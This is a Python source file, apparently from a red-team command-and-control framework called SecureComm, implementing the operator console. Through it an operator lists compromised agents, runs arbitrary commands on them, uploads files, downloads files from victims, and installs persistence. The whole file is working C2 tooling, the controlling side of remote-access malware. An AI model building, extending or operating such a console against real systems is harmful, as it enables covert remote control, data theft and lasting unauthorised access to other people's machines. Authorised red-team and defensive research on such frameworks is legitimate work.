"""
SecureComm Operator Console
Command & Control interface for red team operations
"""

import sys
import cmd
import json
import time
import base64
import hashlib
import os
import shlex
from pathlib import Path
from typing import Optional, Dict
from rich.console import Console
from rich.table import Table
from rich import print as rprint
import click

from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID

from .auth_gateway import AuthGateway
from .config import (
    AUDIT_LOG_DIR,
    DEFAULT_HOST,
    DEFAULT_PORT,
    OPERATIONAL_DB_PATH,
    OPERATOR_FILES_DIR,
    MAX_TRANSFER_BYTES,
    MAX_TRANSFER_PAYLOAD,
)
from .pki_manager import PKIManager
from .crypto_engine import CryptoEngine
from .operational_db import OperationalDatabase
from .security import SecurityModule
from .server_listener import SecureCommServer
from .audit import AuditLogger


class OperatorConsole(cmd.Cmd):
    """
    Interactive operator console for SecureComm C2
    
    Commands:
    - list: Show active agents
    - select <agent_id>: Select agent
    - exec <command>: Execute command
    - upload <file>: Upload file
    - download <file>: Download file
    - persist: Install persistence
    - rotate: Rotate session key
    - exit: Disconnect agent
    """
    
    intro = """
🔥 SecureComm Operator Console v1.0 🔥
Type 'help' for available commands
Type 'quit' to exit
"""
    
    prompt = "operator@securecomm> "
    
    def __init__(
        self,
        cert_path: str,
        key_path: str,
        ca_cert_path: str,
        host: str = DEFAULT_HOST,
        port: int = DEFAULT_PORT,
        operator_id: Optional[str] = None,
        operator_key_password: Optional[bytes] = None,
        pki_path: Optional[str] = None,
    ):
        """
        Initialize Operator Console
        
        Args:
            cert_path: Operator certificate
            key_path: Operator private key
            ca_cert_path: CA certificate
        """
        super().__init__()
        
        self.console = Console()
        self.cert_path = cert_path
        self.key_path = key_path
        self.ca_cert_path = ca_cert_path
        self.host = host
        self.port = port
        self.operator_id = operator_id
        
        # Initialize components
        self.crypto = CryptoEngine()
        self.security = SecurityModule()
        self.audit = AuditLogger(log_dir=str(AUDIT_LOG_DIR))
        self.operational_db = OperationalDatabase(storage_path=str(OPERATIONAL_DB_PATH))
        self.pki_manager = PKIManager(pki_path=pki_path or self._resolve_pki_path())
        self.operator_files_dir = OPERATOR_FILES_DIR
        self.operator_files_dir.mkdir(parents=True, exist_ok=True)
        
        # Active agents
        self.agents: Dict[str, dict] = {}
        self.selected_agent: Optional[str] = None

        # Load operator keys and auth gateway
        self.operator_cert: Optional[x509.Certificate] = None
        self.operator_signing_key = None
        self._load_operator_keys(operator_key_password)
        self.operator_id = self._resolve_operator_id(self.operator_id)
        self.auth_gateway = self._init_auth_gateway()
        self.auth_token = self.auth_gateway.authenticate(
            self.operator_id,
            self.operator_cert,
        ).token

        # Start server listener
        self.server = SecureCommServer(
            operator_id=self.operator_id,
            host=self.host,
            port=self.port,
            cert_path=self.cert_path,
            key_path=self.key_path,
            ca_cert_path=self.ca_cert_path,
            operator_signing_key=self.operator_signing_key,
            operational_db=self.operational_db,
            security=self.security,
            auth_gateway=self.auth_gateway,
            audit_logger=self.audit,
            pki_path=str(self.pki_manager.pki_path),
        )
        self.server.start()
        self.sessions = self.server.sessions
    
    def _load_operator_keys(self, password: Optional[bytes]) -> None:
        """Load operator signing keys and certificate."""
        key_bytes = Path(self.key_path).read_bytes()
        self.operator_signing_key = self.crypto.load_signing_private_key(key_bytes, password=password)
        cert_bytes = Path(self.cert_path).read_bytes()
        self.operator_cert = x509.load_pem_x509_certificate(cert_bytes, default_backend())

    def _resolve_operator_id(self, operator_id: Optional[str]) -> str:
        if not self.operator_cert:
            raise ValueError("Operator certificate not loaded")
        cn = self.operator_cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
        if operator_id and operator_id != cn:
            raise ValueError("Operator ID mismatch with certificate CN")
        return operator_id or cn

    def _resolve_operator_path(self, raw_path: str) -> Path:
        base = self.operator_files_dir.resolve()
        candidate = Path(raw_path)
        if not candidate.is_absolute():
            candidate = (base / candidate).resolve()
        else:
            candidate = candidate.resolve()
        if candidate == base or base in candidate.parents:
            return candidate
        raise ValueError("path_outside_operator_directory")

    def _init_auth_gateway(self) -> AuthGateway:
        ca_certificate = self._load_ca_certificate()
        return AuthGateway(
            ca_certificate=ca_certificate,
            certificate_validator=lambda cert: self.pki_manager.validate_certificate(
                cert,
                ca_certificate,
            ),
            audit_logger=self.audit,
        )

    def _load_ca_certificate(self) -> x509.Certificate:
        cert_bytes = Path(self.ca_cert_path).read_bytes()
        return x509.load_pem_x509_certificate(cert_bytes, default_backend())

    def _resolve_pki_path(self) -> str:
        ca_path = Path(self.ca_cert_path)
        if len(ca_path.parents) >= 2:
            return str(ca_path.parents[1])
        return str(ca_path.parent)
    
    def do_list(self, arg):
        """List all active agents"""
        self._sync_agents()
        if not self.agents:
            rprint("[yellow]No active agents[/yellow]")
            return
        
        table = Table(title="Active Agents")
        table.add_column("Agent ID", style="cyan")
        table.add_column("IP Address", style="magenta")
        table.add_column("Status", style="green")
        table.add_column("Commands", style="yellow")
        table.add_column("Last Seen", style="blue")
        
        for agent_id, info in self.agents.items():
            table.add_row(
                agent_id,
                info['ip'],
                info['status'],
                str(info['command_count']),
                info['last_seen']
            )
        
        self.console.print(table)
    
    def do_select(self, agent_id):
        """Select an agent: select <agent_id>"""
        self._sync_agents()
        if agent_id not in self.agents:
            rprint(f"[red]Agent {agent_id} not found[/red]")
            return
        
        self.selected_agent = agent_id
        self.prompt = f"[{agent_id}] operator@securecomm> "
        rprint(f"[green]Selected agent: {agent_id}[/green]")
    
    def do_exec(self, command):
        """Execute command on selected agent: exec <command>"""
        if not self.selected_agent:
            rprint("[red]No agent selected. Use 'select <agent_id>' first[/red]")
            return
        
        try:
            task_id = self.server.send_command(
                agent_id=self.selected_agent,
                cmd_type="exec",
                payload=command,
                auth_token=self.auth_token,
            )
        except Exception as exc:
            rprint(f"[red]Command failed: {exc}[/red]")
            return

        result = self._wait_for_response(task_id)
        if result is None:
            rprint("[red]No response received[/red]")
            return

        self.audit.log_command(self.selected_agent, "exec", command)
        rprint(f"[green]Output:[/green]\n{result.get('result')}")
    
    def do_upload(self, filepath):
        """Upload file to agent: upload <filepath>"""
        if not self.selected_agent:
            rprint("[red]No agent selected[/red]")
            return

        try:
            args = shlex.split(filepath)
        except ValueError as exc:
            rprint(f"[red]Invalid arguments: {exc}[/red]")
            return

        if not args:
            rprint("[red]Usage: upload <local_path> [remote_path][/red]")
            return

        local_path = Path(args[0]).expanduser()
        if not local_path.exists() or not local_path.is_file():
            rprint("[red]Local file not found[/red]")
            return

        file_size = local_path.stat().st_size
        if file_size > MAX_TRANSFER_BYTES:
            rprint("[red]File exceeds transfer size limit[/red]")
            return

        raw_bytes = local_path.read_bytes()
        checksum = hashlib.sha256(raw_bytes).hexdigest()
        encoded = base64.b64encode(raw_bytes).decode("utf-8")
        if len(encoded) > MAX_TRANSFER_PAYLOAD:
            rprint("[red]Encoded payload exceeds transfer limit[/red]")
            return

        remote_path = args[1] if len(args) > 1 else local_path.name
        payload = {
            "path": remote_path,
            "size": file_size,
            "sha256": checksum,
            "data": encoded,
        }
        payload_json = json.dumps(payload)
        if len(payload_json) > MAX_TRANSFER_PAYLOAD:
            rprint("[red]Payload exceeds transfer limit[/red]")
            return

        try:
            task_id = self.server.send_command(
                agent_id=self.selected_agent,
                cmd_type="upload",
                payload=payload_json,
                auth_token=self.auth_token,
            )
        except Exception as exc:
            rprint(f"[red]Upload failed: {exc}[/red]")
            return

        result = self._wait_for_response(task_id)
        if result is None:
            rprint("[red]No response received[/red]")
            return

        if result.get("status") == "success":
            rprint(f"[green]Upload complete:[/green] {result.get('result')}")
        else:
            rprint(f"[red]Upload failed:[/red] {result.get('result')}")
    
    def do_download(self, filepath):
        """Download file from agent: download <filepath>"""
        if not self.selected_agent:
            rprint("[red]No agent selected[/red]")
            return

        try:
            args = shlex.split(filepath)
        except ValueError as exc:
            rprint(f"[red]Invalid arguments: {exc}[/red]")
            return

        if not args:
            rprint("[red]Usage: download <remote_path> [local_path][/red]")
            return

        remote_path = args[0]
        payload = {"path": remote_path}

        try:
            task_id = self.server.send_command(
                agent_id=self.selected_agent,
                cmd_type="download",
                payload=json.dumps(payload),
                auth_token=self.auth_token,
            )
        except Exception as exc:
            rprint(f"[red]Download failed: {exc}[/red]")
            return

        result = self._wait_for_response(task_id)
        if result is None:
            rprint("[red]No response received[/red]")
            return

        if result.get("status") != "success":
            rprint(f"[red]Download failed:[/red] {result.get('result')}")
            return

        response = result.get("result")
        if not isinstance(response, dict):
            rprint("[red]Invalid download response[/red]")
            return

        encoded = response.get("data")
        sha256_value = response.get("sha256")
        size_value = response.get("size")
        if not isinstance(encoded, str) or not isinstance(sha256_value, str) or not isinstance(size_value, int):
            rprint("[red]Invalid download payload[/red]")
            return

        try:
            raw_bytes = base64.b64decode(encoded, validate=True)
        except Exception as exc:
            rprint(f"[red]Download payload invalid: {exc}[/red]")
            return

        if len(raw_bytes) != size_value:
            rprint("[red]Download payload size mismatch[/red]")
            return

        checksum = hashlib.sha256(raw_bytes).hexdigest()
        if checksum != sha256_value:
            rprint("[red]Download checksum mismatch[/red]")
            return

        local_path = Path(args[1]).expanduser() if len(args) > 1 else Path(remote_path).name
        try:
            destination = self._resolve_operator_path(str(local_path))
        except ValueError as exc:
            rprint(f"[red]Invalid local path: {exc}[/red]")
            return
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(raw_bytes)
        try:
            os.chmod(destination, 0o600)
        except Exception:
            pass

        rprint(f"[green]Downloaded to:[/green] {destination}")
    
    def do_persist(self, arg):
        """Install persistence on agent: persist"""
        if not self.selected_agent:
            rprint("[red]No agent selected[/red]")
            return
        
        try:
            task_id = self.server.send_command(
                agent_id=self.selected_agent,
                cmd_type="persist",
                payload="",
                auth_token=self.auth_token,
            )
        except Exception as exc:
            rprint(f"[red]Command failed: {exc}[/red]")
            return

        result = self._wait_for_response(task_id)
        if result is None:
            rprint("[red]No response received[/red]")
            return

        if result.get("status") == "success":
            rprint(f"[green]{result.get('result')}[/green]")
        else:
            rprint(f"[red]{result.get('result')}[/red]")

    
    def do_rotate(self, arg):
        """Rotate session key for selected agent"""
        if not self.selected_agent:
            rprint("[red]No agent selected[/red]")
            return
        
        rprint("[yellow]Rotating session key...[/yellow]")
        try:
            self.server.request_key_rotation(self.selected_agent, auth_token=self.auth_token)
            rprint("[green]Session key rotation requested[/green]")
        except Exception as exc:
            rprint(f"[red]Rotation failed: {exc}[/red]")
    
    def do_quit(self, arg):
        """Exit operator console"""
        rprint("[yellow]Shutting down...[/yellow]")
        try:
            self.auth_gateway.revoke_token(self.auth_token)
        except Exception:
            pass
        self.server.stop()
        return True
    
    def _send_command(self, agent_id: str, cmd_type: str, payload: str) -> Optional[dict]:
        """
        Send encrypted & signed command to agent
        
        Args:
            agent_id: Target agent
            cmd_type: Command type (exec, upload, download)
            payload: Command payload
        
        Returns:
            Command result or None
        """
        # 1. Get session
        session = self.sessions.get_session(agent_id)
        if not session:
            rprint("[red]No active session[/red]")
            return None

        try:
            task_id = self.server.send_command(
                agent_id=agent_id,
                cmd_type=cmd_type,
                payload=payload,
                auth_token=self.auth_token,
            )
        except Exception as exc:
            rprint(f"[red]Command failed: {exc}[/red]")
            return None

        return self._wait_for_response(task_id)

    def _wait_for_response(self, task_id: str, timeout: int = 15, poll_interval: float = 0.25) -> Optional[dict]:
        deadline = time.time() + timeout
        while time.time() < deadline:
            record = self.operational_db.get_command(task_id)
            if record and record.response:
                return record.response
            time.sleep(poll_interval)
        return None

    def _sync_agents(self) -> None:
        agents = {}
        for record in self.operational_db.list_agents():
            agents[record.agent_id] = {
                "ip": record.ip_address,
                "status": record.status,
                "command_count": 0,
                "last_seen": record.last_seen.isoformat(),
            }
        self.agents = agents


# CLI entry point
@click.group()
def cli():
    """SecureComm Operator Console"""
    pass


@cli.command()
@click.option('--cert', required=True, help='Operator certificate path')
@click.option('--key', required=True, help='Operator private key path')
@click.option('--ca-cert', required=True, help='CA certificate path')
@click.option('--host', default='0.0.0.0', help='Listen host')
@click.option('--port', default=8443, help='Listen port')
@click.option('--operator-id', required=False, help='Override operator identity (CN)')
@click.option('--operator-key-password', required=False, help='Operator key password')
@click.option('--pki-path', required=False, help='PKI base path')
def start(cert, key, ca_cert, host, port, operator_id, operator_key_password, pki_path):
    """Start operator console"""
    key_password = operator_key_password.encode("utf-8") if operator_key_password else None
    console = OperatorConsole(
        cert_path=cert,
        key_path=key,
        ca_cert_path=ca_cert,
        host=host,
        port=port,
        operator_id=operator_id,
        operator_key_password=key_password,
        pki_path=pki_path,
    )
    console.cmdloop()


if __name__ == "__main__":
    cli()